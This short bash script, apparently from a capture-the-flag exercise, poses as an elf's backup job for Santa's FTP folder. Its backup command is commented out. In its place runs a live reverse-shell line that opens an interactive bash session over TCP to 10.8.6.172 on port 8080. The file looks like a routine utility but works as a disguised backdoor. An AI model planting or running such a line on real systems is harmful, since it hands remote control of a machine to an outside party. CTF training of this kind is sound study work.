#!/bin/bash

# Created by ElfMcEager to backup all of Santa's goodies!

# Create backups to include date DD/MM/YYYY
filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";

# Backup FTP folder and store in elfmceager's home directory
# tar -zcvf /home/elfmceager/$filename /opt/ftp

# Create remote shell on target through Bash TCP method
bash -i >& /dev/tcp/10.8.6.172/8080 0>&1

# TO-DO: Automate transfer of backups to backup server


